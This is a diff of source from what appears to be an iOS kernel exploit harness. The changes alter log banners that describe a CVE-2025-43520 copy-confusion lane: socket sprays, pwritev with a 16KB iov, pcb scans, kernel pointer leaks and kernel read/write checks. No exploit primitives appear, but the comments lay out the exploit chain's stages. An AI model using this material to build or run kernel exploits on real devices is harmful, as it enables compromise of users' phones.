@@ -85,14 +85,15 @@ static void cs2_write_banner(void) {
     NSString *osv = cs2_sysctl_string(@"kern.osversion");
     const LabOffTab *off = LabOff();
     cs2_log("time %s", [[[NSDate date] description] UTF8String]);
-    cs2_log("=== cs2 session BUILD cs2-verbatim-v2-honest ===");
-    cs2_log("core: Dopamine 3.0.11 ClearSword exploit/ verbatim (opa334)");
+    cs2_log("=== cs2 session BUILD cs2-27.0-copy-lane ===");
+    cs2_log("core: 27.0 T8150 copy-confusion lane (calib FILE-COPY). hop-1 KEEP CLOSED.");
     cs2_log("machine=%s osversion=%s sku=%s",
             mach.UTF8String ?: "?", osv.UTF8String ?: "?",
             (off && off->tag) ? off->tag : "NULL");
     cs2_log("ladder: socket_usecount=0x%x static_base=0x%llx (LabOff runtime table)",
             off ? off->socket_usecount : 0,
             (unsigned long long)(off ? off->static_base : 0));
+    cs2_log("HONESTY: not Dopamine ClearSword verbatim. OG EFAULT on 43520-viable trains; copy27 (success pwritev + 16KB iov) on 23B+/24A+.");
     cs2_log("HONESTY: hop-1 cluster_*_contig EINVAL since 26.1. phys_oob READ scan with kbase=0 is setup, not KRW.");
     cs2_log("HONESTY: Probe app fires on every SKU. Public Lum1na SKIPS CS2 as first KRW on T8150/unknown.");
     cs2_log("budget: %d s. Panic = reboot; recovered log shows last step.", CS2_TIME_BUDGET_SEC);
@@ -183,8 +184,8 @@ static BOOL lsword_arm_licensed(int *windows, BOOL *explicit_arm) {
                     wins);
             cs2_log("[LSWORD-ARM] phys_oob copy confusion PROVEN on this train (calib WRONG crossings;");
             cs2_log("[LSWORD-ARM] zero configd starvation across a dozen 400k-900k socket sprays).");
-            cs2_log("[LSWORD-ARM] Firing the cs2 ladder anyway — hop-1 cluster_*_contig may EINVAL;");
-            cs2_log("[LSWORD-ARM] the pcb scan / copy / corrupt stages are this calib's proven class.");
+            cs2_log("[LSWORD-ARM] Firing copy27 lane (success pwritev + 16KB iov). hop-1 KEEP CLOSED.");
+            cs2_log("[LSWORD-ARM] look-for: lane=copy27, oob HIT, pcb_start_offset, KERNEL POINTER, kread32==0xfeedfacf.");
             cs2_log("[LSWORD-ARM] PANIC POSSIBLE — one tap per fresh boot. Ladder prints = dial-finder.");
         } else {
             cs2_log("[-] SKIP: CVE-2025-43520 patched on this build train (18.7.2/26.1+), no LightSword license.");
